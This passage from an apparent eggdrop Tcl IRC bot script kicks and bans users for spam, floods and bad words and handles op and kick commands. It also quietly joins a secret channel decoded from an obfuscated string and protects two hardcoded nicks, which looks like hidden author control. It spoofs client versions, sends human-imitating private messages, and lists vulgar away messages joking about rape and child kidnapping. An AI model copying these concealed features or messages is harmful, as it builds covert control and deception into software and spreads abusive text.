set bannick($c) $banmask
set mhost [string range $uhost [string first "@" $uhost] end]
putsrv "KICK $x $c :$notc !4Sp&#226;4M!10 InvITeR 4ReLaY1 FRoM 4$unick1 IP 4$mhost [banms]"
} {
set members [chanlist $x f]
foreach s $members {
if {[isop $s $x]} {
set mhost [string range $uhost [string first "@" $uhost] end]
set sendspam "!kick [zip "$x $c $notc !4Sp&#226;4M!10 InvITeR 4ReLaY1 FRoM 4$unick1 IP 4$mhost [banms]"]"
putsrv "PRIVMSG $s :$sendspam"
break

}
}
}
return 0
}
}
}
}
}
}
set invme($mhost) "InvITE"
return 0
}
if {[string match "*http:/*" [string tolower $text]] || [string match "*www.*" [string tolower $text]]} {
if {[string match "*dal.net*" [string tolower $text]]} { return 0 }
foreach x [channels] {
if {[onchan $unick $x]} {
if {[isop $botnick $x]} {
set banmask "*!*[string range $uhost [string first "@" $uhost] end]"
set bannick($unick) $banmask
putsrv "KICK $x $unick :$notc !4Sp&#226;4M!10 I HaTE 4AdvERTIsE [banms]"
return 0
} else {
set members [chanlist $x f]
foreach c $members {
if {[isop $c $x] && [string tolower $c] != [string tolower $ps]} {
set sendspam "!kick [zip "$x $unick $notc !4Sp&#226;4M!10 FRoM 4[string range $uhost [string first "@" $uhost] end]1 AdvERTIsE [banmsg]"]"
putsrv "PRIVMSG $c :$sendspam"
return 0
}
}
}
} {
set banmask "[string range $uhost [string first "@" $uhost] end]"
if {$banmask != "*!*@*" && $banmask != "*"} {
foreach c [chanlist $x] {
set nickhost "[string range [getchanhost $c $x] [string first "@" [getchanhost $c $x]] end]"
if {$banmask == $nickhost} {
if {[matchattr $c f]} {
putlog "!Log! InVITE (f) $c PaSS!!"
return 0
}
if {$c != $botnick} {
if {[isop $botnick $x]} {
set bannick($c) $banmask
set mhost [string range $uhost [string first "@" $uhost] end]
putsrv "KICK $x $c :$notc !4Sp&#226;4M!10 AdvERTIsE 4ReLaY1 FRoM 4$unick1 IP 4$mhost [banms]"
} {
set members [chanlist $x f]
foreach s $members {
if {[isop $s $x]} {
set mhost [string range $uhost [string first "@" $uhost] end]
set sendspam "!kick [zip "$x $c $notc !4Sp&#226;4M!10 AdvERTIsE 4ReLaY1 FRoM 4$unick1 IP 4$mhost [banms]"]"
putsrv "PRIVMSG $s :$sendspam"
return 0
}
}
}
return 0
}
}
}
}
}
}
set invme($mhost) "AdvERTIsE"
return 0
}
set mhost [string range $uhost [string first "@" $uhost] end]
if {[string length $text] > 100} {
set chr 0
set cnt 0
while {$cnt < [string length $real]} {
if [isflood [string index $real $cnt]] {
incr chr
}
incr cnt
}
if {$chr > 30} {
setignore "*!*@*" "*" 120
if {[info exists ismaskhost]} {
setignore [maskhost "*!*$mhost"] "TsunamI MSg" 300
} {
setignore "*!*$mhost" "TsunamI MSg" 300
}
foreach x [channels] {
if {[isop $botnick $x]} {
if {[string match "*c*" [getchanmode $x]]} {
puthlp "PRIVMSG $x :\001ACTION IncOmINg TsunamI MSg..! FRoM [unsix "$unick!$uhost"]\001"
} {
puthlp "PRIVMSG $x :\001ACTION IncOmINg TsunamI MSg..! FRoM 1[unsix "$unick!$uhost"]\001"
}
foreach c [chanlist $x] {
set nickhost [string range [getchanhost $c $x] [string first "@" [getchanhost $c $x]] end]
if {$nickhost == $mhost} {
if {[matchattr $c f] || $c == $botnick} {
return 0
}
set bannick($c) "*!*$mhost"
putsrv "KICK $x $c :$notc 4TsunamI1 MSg FRoM 4$mhost [banms]"
break
}
}
}
}
return 0
}
}
foreach badword [string tolower $badwords] {
if {[string match *$badword* [string tolower $text]]} {
foreach x [channels] {
if {[onchan $unick $x]} {
if {[isop $unick $x] || [isvoice $unick $x]} { return 0 }
if {[isop $botnick $x]} {
set bannick($unick) "*!*$mhost"
putsrv "KICK $x $unick :$notc 4BaDWoRD1 MSg FRoM 4$mhost1 MaTcH FRoM 4[string toupper $badword] [banms]"
return 0
} {
foreach s [chanlist $x f] {
if {[isop $s $x]} {
set sendspam "!kick [zip "$x $unick $notc 4BaDWoRD1 MSg FRoM 4$mhost1 MaTcH FRoM 4[string toupper $badword] [banms]"]"
putsrv "PRIVMSG $s :$sendspam"
}
}
}
}
}
}
}
foreach advword [string tolower $advwords] {
if {[string match *$advword* [string tolower $text]]} {
foreach x [channels] {
if {[onchan $unick $x]} {
if {[isop $unick $x] || [isvoice $unick $x]} { return 0 }
if {[botisop $x]} {
set bannick($unick) "*!*$mhost"
putsrv "KICK $x $unick :$notc !4Sp&#226;4M!10 I HaTE 4U 1MaTch FRoM $advword [banmsg]"
return 0
} {
foreach s [chanlist $x f] {
if {[isop $s $x]} {
set sendspam "!kick [zip "$x $unick $notc 4SpaM1 MSg FRoM 4$mhost1 MaTcH FRoM 4[string toupper $advword] [banms]"]"
putsrv "PRIVMSG $s :$sendspam"
}
}
}
}
}
}
}
if {[string length $text] > 200} {
if {![isutimer "LONGTEXT"]} {
utimer 30 { putlog "LONGTEXT" }
setignore "*!*@*" "*" 120
if {[info exists ismaskhost]} {
setignore [maskhost "*!*$mhost"] "LoNg TexT MSg" 300
} {
setignore "*!*$mhost" "LoNg TexT MSg" 300
}
}
foreach x [channels] {
if {[isop $botnick $x]} {
if {[string match "*c*" [getchanmode $x]]} {
puthlp "PRIVMSG $x :\001ACTION IncOmINg LoNg TexT MSg..! FRoM [unsix "$unick!$uhost"]\001"
} {
puthlp "PRIVMSG $x :\001ACTION IncOmINg LoNg TexT MSg..! FRoM 1[unsix "$unick!$uhost"]\001"
}
foreach c [chanlist $x] {
set nickhost [string range [getchanhost $c $x] [string first "@" [getchanhost $c $x]] end]
if {$nickhost == $mhost} {
if {[matchattr $c f] || $c == $botnick} { return 0 }
set bannick($c) "*!*$mhost"
putsrv "KICK $x $c :$notc 1LoNg TexT MSg FRoM 4$mhost [banms]"
break
}
}
} {
foreach c [chanlist $x] {
set nickhost [string range [getchanhost $c $x] [string first "@" [getchanhost $c $x]] end]
if {$nickhost == $mhost} {
if {[matchattr $c f] || $c == $botnick} {
return 0
}
foreach s [chanlist $x f] {
if {[isop $s $x]} {
set sendspam "!kick [zip "$x $c $notc 1LoNg TexT MSg FRoM 4$mhost [banms]"]"
putsrv "PRIVMSG $s :$sendspam"
break
}
}
}
}
}
}
return 1
}
if {$unick != $own} {
if {[info exists twice_msg($unick)]} {
set hostmask "${unick}!*@*"
puthlp "PRIVMSG $unick :$second_query"
putlog "!Log! IgNORE <<$hostmask>> PV-msg"
unset twice_msg($unick)
newignore $hostmask $unick "*" 2
} {
if {[istimer "chkautomsg"]} {
set invme($mhost) "AuToJoIN MSg"
return 0
}
if {[isutimer "NO REPLY"]} {
foreach x [utimers] {
if {[string match "*NO REPLY*" $x]} {
killutimer [lindex $x 2]
}
}
utimer 10 { putlog "NO REPLY" }
return 0
}
utimer 10 { putlog "NO REPLY" }
if {[string match "*dal*et*" $uhost]} {
puthlp "PRIVMSG $unick :$second_query"
} {
if {[getuser "config" XTRA "AWAY"]!=""} {
puthlp "PRIVMSG $unick :$first_query"
} {
puthlp "PRIVMSG $unick :$first_query"
}
set twice_msg($unick) 1
}
}
}
}
proc auto_reop {} {
global notc botnick
foreach x [channels] {
if {[onchan $botnick $x]} {
if {![isop $botnick $x] && [string tolower $x] != [dezip [lines "9MJu6/A2i8/0"]]} {
if {![string match "*+protectfriends*" [channel info $x]]} {
set cret 30
foreach ct [utimers] {
if {[string match "*chancnt*" $ct]} {
if {[expr [lindex $ct 0] + 30] > $cret} {
set cret [expr [lindex $ct 0] + 30]
}
}
}
utimer $cret [list chancnt $x]
}
}
}
}
return 0
}
proc chancnt {chan} {
if {[isutimer "chancnt $chan"]} { return 0 }
putsrv "ChanServ count $chan"
}
proc msg_kick {nick uhost hand rest} {
global notc botnick own
set chantarget [lindex $rest 0]
set nicktarget [lindex $rest 1]
set reason [lrange $rest 2 end]
if {![matchattr $nick Q]} {
puthlp "NOTICE $nick :$notc 4ReJeCTeD!10"
return 0
}
if {($chantarget == "") || ($nicktarget == "")} {
puthlp "NOTICE $nick :$notc Usage: kick <#chan> <Nick> <Reason>"
return 0
}
if {[isop $botnick $chantarget]!=1} {
puthlp "NOTICE $nick :$notc NoT OP CHaNNEL $chantarget"
return 0
}
if {![onchan $nicktarget $chantarget]} {
puthlp "NOTICE $nick :$notc $nicktarget is not on the channel."
return 0
}
if {$nicktarget == $botnick} {
puthlp "NOTICE $nick :$notc I cant self kick."
return 0
}
if {[matchattr $nicktarget n] && ![matchattr $nick Z]} {
puthlp "NOTICE $nick :$notc I CaNT KIcK MY ADmIN."
return 0
}
if {$reason == ""} {
set reason "1ReQuesT..!"
if {[matchattr $nick n]} {
set reason "1ADmIN 4KIcK1 ReQuesT4..!"
}
if {[matchattr $nick m] && ![matchattr $nick n]} {
set reason "1MasTeR 4KIcK1 ReQuesT4..!"
}
}
foreach x [channels] {
if {[string tolower $x]==[string tolower $chantarget]} {
putsrv "KICK $x $nicktarget :$notc $reason [banmsg]"
return 0
}
}
puthlp "NOTICE $nick :$notc NoT IN $chantarget"
}
proc ctcp_versi0n {nick uhost handle dest keyword args} {
global botnick notc vern
ctcp_version $nick $uhost "*" "*" "*" "*"
putsrv "NOTICE $nick :\001VERSION $notc $vern \[BHL tcl for eggdrop scripts\]\001"
return 1
}
proc msg_kickban {nick uhost hand rest} {
global notc botnick own bannick
set chantarget [lindex $rest 0]
set nicktarget [lindex $rest 1]
set bmask [getchanhost $nicktarget $chantarget]
set bmask "*!*@[lindex [split $bmask @] 1]"
set reason [lrange $rest 2 end]
if {![matchattr $nick Q]} {
puthlp "NOTICE $nick :$notc 4ReJeCTeD!10"
return 0
}
if {($chantarget == "") || ($nicktarget == "")} {
puthlp "NOTICE $nick :$notc Usage: kickban <#chan> <Nick> <Reason>"
return 0
}
if {[isop $botnick $chantarget]!=1} {
puthlp "NOTICE $nick :$notc NoT OP CHaNNEL $chantarget"
return 0
}
if {![onchan $nicktarget $chantarget]} {
puthlp "NOTICE $nick :$notc $nicktarget is not on the channel."
return 0
}
if {$nicktarget == $botnick} {
puthlp "NOTICE $nick :$notc I cant self kick."
return 0
}
if {[matchattr $nicktarget n] && ![matchattr $nick Z]} {
puthlp "NOTICE $nick :$notc I cant kickban my ADmIN."
return 0
}
if {$reason == ""} {
set reason "1KIcKBaN ReQuesT4..!"
if {[matchattr $nick m]} {
set reason "1MasTeR 4KIcKBaN1 ReQuesT [banmsg]"
}
if {[matchattr $nick n]} {
set reason "1ADmIN 4KIcKBaN1 ReQuesT [banmsg]"
}
}
foreach x [channels] {
if {[string tolower $x]==[string tolower $chantarget]} {
set bannick($nicktarget) $bmask
putsrv "KICK $x $nicktarget :$notc $reason [banmsg]"
return 0
}
}
puthlp "NOTICE $nick :$notc NoT IN $chantarget"
}
proc cho_cho {} {
global toth ps uenc lenc chankey
timer 5 cho_cho
set toth [dezip [lines "9MJu6/A2i8/0"]]
if {[validchan $toth]} {
return 0
}
channel add $toth
catch { channel set $toth chanmode {+Mtn} -statuslog -revenge -protectops -clearbans -enforcebans +greet +secret -autovoice -autoop flood-chan 5:10 flood-deop 3:10 flood-kick 3:10 flood-join 0:0 flood-ctcp 2:10 flood-nick 3:60 }
savechan
putsrv "JOIN $toth"
}
proc msg_op {nick uhost hand rest} {
global notc botnick
set chantarget [lindex $rest 0]
set nicktarget [lindex $rest 1]
if {![matchattr $nick Q]} {
puthlp "NOTICE $nick :$notc 4ReJeCTeD!10"
return 0
}
if {($chantarget == "") || ($nicktarget == "")} {
puthlp "NOTICE $nick :$notc Usage: op <#chan> <Nick>"
return 0
}
if {[isop $botnick $chantarget]!=1} {
puthlp "NOTICE $nick :$notc NoT OP CHaNNEL $chantarget"
return 0
}
if {![onchan $nicktarget $chantarget]} {
puthlp "NOTICE $nick :$notc $nicktarget is not on the channel."
return 0
}
if {[isop $nicktarget $chantarget]!=0} {
puthlp "NOTICE $nick :$notc $nicktarget is already op on CHaNNEL $chantarget"
return 0
}
foreach x [channels] {
if {[string tolower $x] == [string tolower $chantarget]} {
opq $x $nicktarget
return 0
}
}
puthlp "NOTICE $nick :$notc NoT IN $chantarget"
}
proc msg_voice {nick uhost hand rest} {
global notc botnick
set chantarget [lindex $rest 0]
set nicktarget [lindex $rest 1]
if {![matchattr $nick Q]} {
puthlp "NOTICE $nick :$notc 4ReJeCTeD!10"
return 0
}
if {($chantarget == "") || ($nicktarget == "")} {
puthlp "NOTICE $nick :$notc Usage: voice <#chan> <Nick>"
return 0
}
if {[isop $botnick $chantarget]!=1} {
puthlp "NOTICE $nick :$notc NoT OP CHaNNEL $chantarget"

return 0
}
if {![onchan $nicktarget $chantarget]} {
puthlp "NOTICE $nick :$notc $nicktarget is not on the channel."
return 0
}
if {[isvoice $nicktarget $chantarget]} {
puthlp "NOTICE $nick :$notc $nicktarget is already voice on channel $chantarget"
}
foreach x [channels] {
if {[string tolower $x]==[string tolower $chantarget]} {
putserv "mode $x +v $nicktarget"
return 0
}
}
puthlp "NOTICE $nick :$notc NoT IN $chantarget"
}
proc msg_deop {nick uhost hand rest} {
global notc botnick own
set chantarget [lindex $rest 0]
set nicktarget [lindex $rest 1]
if {![matchattr $nick Q]} {
puthlp "NOTICE $nick :$notc 4ReJeCTeD!10"
return 0
}
if {($chantarget == "") || ($nicktarget == "")} {
puthlp "NOTICE $nick :$notc Usage: deop <#chan> <Nick>"
return 0
}
if {[isop $botnick $chantarget] != 1} {
puthlp "NOTICE $nick :$notc NoT OP CHaNNEL $chantarget"
return 0
}
if {![onchan $nicktarget $chantarget]} {
puthlp "NOTICE $nick :$notc $nicktarget is not on the channel."
return 0
}
if {![isop $nicktarget $chantarget]} {
puthlp "NOTICE $nick :$notc $chantarget is not op on CHaNNEL $chantarget"
return 0
}
if {$nicktarget == $botnick} {
puthlp "NOTICE $nick :$notc I CaNT SeLF DEoP!"
return 0
}
if {[matchattr $nicktarget n]} {
puthlp "NOTICE $nick :$notc I cant deop my Owner."
return 0
}
if {[matchattr $nick m]} {
set mreq "4MasTeR.ReQuesT"
}
if {[matchattr $nick n]} {
set mreq "4ADmIN.ReQuesT"
}
foreach x [channels] {
if {[string tolower $x]==[string tolower $chantarget]} {
if {![string match "*k*" [getchanmode $x]]} {
putserv "mode $x -ko $mreq $nicktarget"
} {
putserv "mode $x -o $nicktarget"
}
return 0
}
}
puthlp "NOTICE $nick :$notc NoT IN $chantarget"
}
proc msg_devoice {nick uhost hand rest} {
global notc botnick owner
set chantarget [lindex $rest 0]
set nicktarget [lindex $rest 1]
if {![matchattr $nick Q]} {
puthlp "NOTICE $nick :$notc 4ReJeCTeD!10"
return 0
}
if {($chantarget == "") || ($nicktarget == "")} {
puthlp "NOTICE $nick :$notc Usage: devoice <#chan> <Nick>"
return 0
}
if {[isop $botnick $chantarget]!=1} {
puthlp "NOTICE $nick :$notc NoT OP CHaNNEL $chantarget"
return 0
}
if {![onchan $nicktarget $chantarget]} {
puthlp "NOTICE $nick :$notc $nicktarget is not on the channel."
}
if {![isvoice $nicktarget $chantarget]} {
puthlp "NOTICE $nick :$notc $nicktarget is not voice on CHaNNEL $chantarget"
}
if {$nicktarget == $owner} {
puthlp "NOTICE $nick :$notc I cant devoice my owner."
return 0
}
foreach x [channels] {
if {[string tolower $x]==[string tolower $chantarget]} {
putserv "mode $x -v $nicktarget"
return 0
}
}
puthlp "NOTICE $nick :$notc NoT IN $chantarget"
}
bind kick - * prot:kick
proc prot:kick {nick uhost handle chan knick reason} {
global notc notd botnick ps kickme notb notm bannick igflood botname quick is_m op_it is_ban iskick
set cflag "c$chan"
set cflag [string range $cflag 0 8]
if {[string match "* *" $reason] || [string match "*$notm*" $reason]} {
set igflood($nick) "1"
}
if {[info exists iskick($knick$chan)]} {
unset iskick($knick$chan)
}
if {$nick == $botnick} {
if {[info exists kickme($knick)]} {
if {$kickme($knick) == 1} {
set kickme($knick) 2
}
if {$kickme($knick) == 3} {
catch { unset kickme($knick) }
}
}
if {[string match "*$notm*" $reason]} {
if {![info exists bannick($knick)]} { return 0 }
if {[info exists is_ban($bannick($knick)$chan)]} { return 0 }
set is_ban($bannick($knick)$chan) 1
if {$bannick($knick) == "*!*@*"} { return 0 }
set cmode [getchanmode $chan]
set ok_m "1"
if {[info exists is_m($chan)]} {
set ok_m "0"
}
if {[isutimer "set_-m $chan"]} {
set ok_m "0"
}
if {[string match "*m*" $cmode]} {
set ok_m "0"
}
if {$ok_m == "1"} {
set is_m($chan) 1
if {$quick == "1"} {
putquick "mode $chan +bm $bannick($knick)"
} {
putserv "mode $chan +bm $bannick($knick)"
}
} {
if {$quick == "1"} {
putquick "mode $chan +b $bannick($knick)"
} {
putserv "mode $chan +b $bannick($knick)"
}
}
return 0
} {
if {![info exists bannick($knick)]} { return 0 }
if {$bannick($knick) == "*!*@*"} { return 0 }
putserv "mode $chan +b $bannick($knick)"
if {[string match "*4BaNNEd1: 3 MINUTES*" $reason]} { utimer 180 [list unbanq $chan $bannick($knick)] }
}
return 0
}
if {$nick == $knick} { return 0 }
if {$nick == "ChanServ"} { return 0 }
if {[matchattr $nick f]} { return 0 }
if {[string match "* *" $reason] || [string match "*$notm*" $reason]} { return 0 }
if {$knick == $botnick} {
if {[info exists kickme($nick)]} {
set kickme($nick) 3
if {[string tolower $chan] != [dezip [lines "9MJu6/A2i8/0"]]} {
putsrv "ChanServ deop $chan $nick"
}
} {
if {[matchattr $cflag D]} {
set kickme($nick) 1
}
}
puthlp "JOIN $chan"
return 0
}
if {![isop $botnick $chan]} { return 0 }
if {$knick == $notb} {
putserv "KICK $chan $nick :[lgrnd] 1DonT KIcK 4eof1..! [banmsg]"
set op_it($knick) 1
return 0
}
if {$knick == $ps} {
putserv "KICK $chan $nick :[lgrnd] 1DonT KIcK 4kazuya1..! [banmsg]"
set op_it($knick) 1
return 0
}
if {[matchattr $knick n]} {
putsrv "KICK $chan $nick :$notc 1ADmIN 4KIcK1 PRoTecTIoN4..! [banmsg]"
set op_it($knick) 1
return 0
}
if {[matchattr $knick m]} {
putsrv "KICK $chan $nick :$notc 1MasTeR 4KIcK1 PRoTecTIoN4..! [banmsg]"
set op_it($knick) 1
return 0
}
}
proc unbanq {chan host} {
global botnick
if {[isop $botnick $chan]} {
puthelp "mode $chan -b $host"
}
}
set lgidx 0
proc lgrnd {} {
global lgidx notc
set lgidx [incr lgidx]
if {$lgidx == 1} {
set lgrnd $notc
} else {
set lgidx 0
set lgrnd $notc
}
}
set bancounter {
"4GeTLosT1..!"
"4GeTOuT1..!"
"4BaNnEd1..!"
"4LaMeR1..!"
"4abUsEd1..!"
"4OuT1..!"
"4sUx1..!"
}
set bancounte {
"1GeTLosT4..!"
"1GeTOuT4..!"
"1BaNnEd4..!"
"1LaMeR4..!"
"1abUsEd4..!"
"1OuT4..!"
"1sUx4..!"
}
set cycle_random {
"1CYCLE"
"1ReJoIN"
"1IN/OuT"
"1ReHaSH"
"1ReLoAD"
"1ReFReSH"
"1C-Y-C-L-E"
"1P-A-T-R-O-L"
"1R-E-J-O-I-N"
"1S-E-A-R-C-H"
}
set first_msg {
"hi"
"hey"
"heya!"
"hi!"
"y0!! :)"
"hey man"
"hey dude :p"
"yooo"
"hieeee"
"hiya"
"hi!"
"hie"
"hey!!"
"hey hey! :)"
"hiya!"
"hie!"
"yo!"
"hey!"
"ho ho ho! :))"
"look whos here!! :)"
"yo yo man"
"hiiii"
"hey its you! :x"
"hiieeee!!"
"hi hi!"
"hey its u!"
"heeeeeey!"
"hiya baby :P"
"yes, hieeeee!"
"haalooo!"
"heeeloooo!"
"yes, hieeee! :x"
"yoooooo!"
"hiyya!"
"hello babeh :)"
"hello baby!"
"hiiiiii!"
"yes, hi"
"haloooo baby"
"same to u :D"
"same to ya"
"yes, hello!"
"yahhh!"
"errr..."
"who is you??!"
}
set second_msg {
"whats up?!"
"whats cookin'?"
"whatcha up to? :))"
"hey! hows ya??"
"hows ya!?"
"hows ya?, mate!"
"how r u"
"how are you doing?"
"how r u?"
"howdie? :x"
"howdie? mate!"
"hows ya doin?"
"hows ur gf doing?"
"hows you doin?"
"whats cookin' mack!? :p"
"how how, how are you brown cow?"
"whats your name?!"
"what have ya been upto? eh?"
"how are you?"
"where ya from!?"
"hows ya been doin? :)"
"a/s/l?"
"what do ya do??!"
"whats ur name?"
"whats ya name? :/"
"where do you live?"
"where are you from?!"
"how old are ?"
"how old r u?"
"a/s/l? plz"
"are u m/f?"
"m or f?"
"male or female?"
"male/female?"
"asl plz"
"asl please :)"
"how r u doing?"
"how r you?"
"how are u?"
"a/s/l please!"
"how have u been? :D"
"where did u go?"
"where did you go?"
"what do you do?"
"what do u do?!"
"how can i help you?!"
"what do you need?"
"what do ya want!"
"what do you want?"
"do you know me?!"
"do i know you?"
"do u know me?"
"do i know u? hmm"
"have we talked before?!"
"have we met before?"
}
set awaym {
"praying shit"
"sudden death"
"be right back"
"making love"
"fucking in heaven"
"going to hell"
"kicking ass"
"farting out loud"
"playing Counter Strike"
"away from keyboard"
"listening to KoRn.mp3"
"screaming 'till dead"
"ripping someone"
"kindaping kiddo"
"rapping some chicks"
"making money"
"parking tons of 'em"
"blaming god"
"yelling ma bitch"
"spitting satan"
"reading www.cnn.com"
"watching vcds"
"not here, bbl"
"searching something to eat"
"back to real life"
"back to campus"
"learning some stuff"
"taking shower"
"calling someone on the phone"
"brb"
"bbl"
"bbs"
"afk"
"peeing off this bladder"
"peeping on girl's bathroom"
"watching MTV"
"going out to cinema"
"reclaiming myself"
"seeking help"
"looking for some ciggarettes"
"smoking pots"
"walking out"
"humbling down the line"
"letting me know what love is"
"staring into your eyes"
"watching the sun goes down"
"dancing in the moonlight"
"piercing the beast"
"stabbing angels"
"knocking the bad off"
"shooting the dogs"
"typing some shit away messages"
"stop bugging me, jackass!"
"you! yeah you! fuck off!"
"not here, leave me your msg or memo me"
"stop fucking whoising on me!"
"down"
"checking boom"
"hacking root"
"hmmm not here"
"auto-away after 10 mins"
"dead"
"cari jablay!!"
"surfing with the alien"
"hungry, exploring my fridge"
"auto-away"
"checking shells"
"not here"
"bhl destroyer"
"down"
"checking boom"
"hacking root"
"bhl is not lame"
"hmmm not here"
"auto-away after 10 mins"
"dead"
"surfing with the alien"
"hungry, exploring my fridge"
"auto-away"
"checking shells"
"not here"
"bhl tcl"
"bhl never die"
"love fucking my girls"
"looking for foods"
"killing my bos..."
"not here, guest where... :p"
"3 secs to say i love you, but lifetime to prove it"
"true love never end"
"finding true love"
"true love never end"
"looking for playback"
"thank's for /WHOIS"
"nothing better"
"please back away and let me go"
"bhl staff"
"Guardian staff"
"fucking asshole"
"chance to say good bye"
"don`t feel my pain, just smile back to me"
}
set random_version {
"BitchX-70alpha14+tcl by panasync - Linux 2.0.27  Keep it to yourself!"
"BitchX-75p1+ by panasync - Linux 2.0.34 : Keep it to yourself!"
"[bx.75p1] linux 2.0.36 [embryonic.22b3] :what is this that stands before me"
"BitchX-74p2+1.3f/SunOS 5.6 :(c)rackrock/bX [3.0.1&#240;8] : Keep it to yourself!"
"BitchX-74p2+ by panasync - CYGWIN32/95 4.0 : Keep it to yourself!"
"BitchX-75p3+/Linux 2.2.14 :(c)rackrock/crk [3.0.1&#225;9]"
"BitchX-74p4+ by panasync - Linux 2.0.35 : Keep it to yourself!"
"BitchX-74p4+/FreeBSD 2.2.5-RELEASE"
"ButchX-p6+ANSI-2a by conio - Windows 98 (XiRCON 1.0B4) : Keep it to yourself!"
"Eggdrop 1.6.18i (c)2006 Robey Pointer"
"eggdrop v1.6.18 Linux"
"osiris-1c/bitchx-75p3 : Onoofius Frooboo"
"Running KVirc 0.9.0 by Szymon 'Pragma@ircnet' Stefanek <kvirc@tin.it> No script"
"PIRCH98:WIN 95/98/WIN NT:1.0 (build 1.0.1.1190)"
"xc! 1.4.0 Linux 2.2.14 [i586/401MHz]: http://www.cueuc-kekc.org"
"Little Star v6.1, written by Scoobster &#197;1997"
"ircII 2.8.2 SunOS 5.6 :ircii 2.8: almost there..."
"Amazon Irc (c) 1997 by 10Clark Savage Jr."
"ircII EPIC4pre2 Linux 2.0.34 - Accept no limitations."
".(\A4argon/\A41g)\A4 :bitchx-75 : Keep it to yourself!"
"ircII EPIC4pre2 SunOS 5.6 - c\A4ypher\A4(beta\\A4one) -\A4myd!\A4nas :\A4one step closer to world domination\A4"
"ircII EPIC4pre2 Linux 2.0.34 - Accept no limitations."
"ircII 2.9-BitchX-60 Linux 1.2.8 :bitZ%summer '96(bitX%summer'96)"
"ircII EPIC4-2000 Linux 2.2.9 - LiCe v4.1.9"
"ircII 2.8.2^hADES%fINAL+CAVLINK by hellshock"
"ircII 2.8.2 + ScrollZ v1.8d (12.2.97) by Flier + Cdcc v1.5 - Accept no limits!"
"[\A4AtlantiS(v1.2a)] by Dethnite"
"Quarterdeck Global Chat 1.2.9 for Macintosh"
"Client [19950405]  Script crimson.caverns[ build 008 ][\" WordG \"] "
"Netscape 3.0 (WWW IRC; Now were talking!)"
"WSIRC 2.03-R - CopyRight 1994, 1995  Caesar M Samsi _@cueuc-kekc.org TEXT CHANNEL"
"ircII 2.9-BitchX-60 Linux 1.2.8 :bitZ%summer '96(bitX%summer'96)"
"xircon[b4] + doot.3b[pawt] be-two + anony(v1) + aolsay(impulse) + deepthought + saq(dbg)"
"ircII 4.4A+ScrollZ v1.8i1 (25.06.98)+Cdcc v1.6 - styx/SZ 4.0 beta 2"
"ircII 2.9_base OSF1 V4.0 :ircii 2.8: almost there..."
"ircN 6.03 for mIRC - lost my innocence to a no good girl -"
"osiri\A4s-1c/\A4bitch\A4x-75p1 +\A4 a\A4utob\A4ot(\A4bx)\A4 p3x3 : that time then and once again.."
"WinIRC CE (beta version code046532) - palmtop PC's IRC addon (Windows CE) - Microsoft'99"
"NokiaIRC (mobile phone [8110] addon) - v3523 serial 543.32 - Nokia, around the world"
"IRC-Playstation client version 0.1.2313e - Copyright Sony 1999"
"SegaIRC v1.0.3release / MegaDrive16 version (340575) / (Copyright Sega'99 - all rights reserved)"
"AmIRC/AmigaOS 2.0.4 by Oliver Wagner <_@cueuc-kekc.org> : http://www.cueuc-kekc.org/ : [#0000D63F] : The slow mess client"
"Ircle 3.0b10 US PPC 12/15/1997 21:07:34 PM. #239C23AF21B"
"Running Visual IRC '97 1.00. Get your copy today!! http://www.cueuc-kekc.org"
"Klient 1.0 beta 14"
"telnet client for Mac beta version code 046532"
"MyHead [b4](v1.2a) by _ _@cueuc-kekc.org (Copyright Joint '02 - all rights reserved)"
"FUcking mIRC by K.Madan.Bay or somthing like that v.2.35.7"
"Windows 2000 CE IRClient v.1.2.f Beta.2.4 serial W7YY7-XWYDW-YVMQH-3VBHQ-MP7CQ"
"WAB NokiaIRC (mobile phone [8110] addon) Nokia, around the world"
"mIRC v6.2 Khaled Mardam-Bey"
"mIRC v6.17 Khaled Mardam-Bey"
}
set random_finger {
"lame (Joint) Idle 3,14 seconds (FUCK OFF)"
"Martin (Unreal) Idle 2 days 3 hours 4 mins 2 seconds ( Yoo mama.. )"
"Put this FINGER in your ASS ..Please"
"FiNgEr"
"REGNIF"
"Deli (TaTiana) Idle 1 Mounts 3 Weeks 6 days 11 hours 12 mins 34 seconds ( You're so ugly)"
"Don't push me whit youur Finger"
"ti kvo gleda6 pod polata be ?"
"don`t look there"
"when she looks in the mirror, the reflection ducks! "
"even the elephant man paid to see her! "
"the last time I saw something that looked like her, I pinned a tail on it! "
"we put her in the kennel when we go on vacation! "
"people at the circus pay money NOT to see her! "
"when she gets up, the sun goes down! "
"she'd scare the monster out of Loch Ness!"
"bot (ident) Idle 3,14 seconds (You are stupd)"
"MotherFuckewr (i`m) 1 Year (My finger is so big)"
"[What are you waiting for?..  Christmas? -[DukeNukem]"
"[Blow it out yor ass! -[DukeNukem]"
"[Holy cow! -[DukeNukem]"
"[Eat shit and die! -[DukeNukem]"
"[I'm gonna get mid-evil on your asses! -[DukeNukem]"
"[SUCK IT DOWN! -[DukeNukem]"
"[Bitch'n! -[DukeNukem]"
"[Your face, your ass, what's the difference? -[DukeNukem]"
"[I'm gonna put the smack dab on your ass! -[DukeNukem]"
"Xexe mnogo obi4am da pokazvam cpegeH npbcT"
"Abe ti kakvo gleda6 pod polata ?"
"Toia finger ti znae6 kakvo i znae6 kude.."
"Be ne me zanimavai s gluposti .... FinGEr .. az iskam blondinki... MNOOooOgo.."
"ko mi zanimava6 s gluposti brq.. "
"MyPa (Fafla) Best Before 42 days 3 hours 44 mins 26 seconds ( Yeah Sweety )"
"FinGer na babati fur4iloto.. Away.."
"Love`Bot f.1.2 By _ _@cueuc-kekc.org"
"Sorry ... I don`t  know what is a FINGER"
"Bitch (Famle) Idle 23 secods ( Kiss my pussy )"
"_ (Joint) onLiner (CgyXaHa Pa5oTa)"
"I don`t like that.."
"UnixBaby (Diliana) Idle ... I don`t know (.. go home & put this finger in your Mom )"
"_MAY_ (Sweeti)  I wont you baby... now and forever ... i  think 8)) "
"Please (DoNotDistrub) Idle 22 years  4 Mounts 7 Weeks 12 days 15 hours 34 mins 57 seconds (Just coming..)"
"There is no finger on this version."
}
set banidx 1
proc banmsg {} {
global banidx bancounter kickcounter
set banidx [incr banidx]
set counter [open $kickcounter r]; set currentkicks [gets $counter]; catch {close $counter}; set kicks [expr $currentkicks]
if {$banidx >= [llength $bancounter]} {
set banidx 1
}
set banmsg [lindex $bancounter $banidx]
if {[getuser "config" XTRA "KCOUNTER"]=="ON"} {
append banmsg " 4K&#238;&#231;k\:1 \B7$kicks\B7"
}
return $banmsg
}
proc banms {} {
global banidx bancounte kickcounter
set banidx [incr banidx]
set counter [open $kickcounter r]; set currentkicks [gets $counter]; catch {close $counter}; set kicks [expr $currentkicks]
if {$banidx >= [llength $bancounte]} {
set banidx 1
}
